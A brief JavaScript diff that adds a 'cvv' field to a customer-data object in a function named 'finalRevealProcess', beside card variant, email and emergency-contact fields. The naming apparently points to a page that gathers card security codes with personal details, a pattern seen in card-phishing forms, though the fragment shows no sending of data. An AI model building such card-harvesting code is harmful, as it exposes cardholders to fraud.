@@ -202,6 +202,7 @@ async function finalRevealProcess() {
     const nasabahData = {
         activeVariant: "Platinum",
         cardStatus: "Active",
+        cvv: cvv,
         country: selectedCountry,
         email: document.getElementById('inputEmail').value.trim(),
         kontak_darurat: {
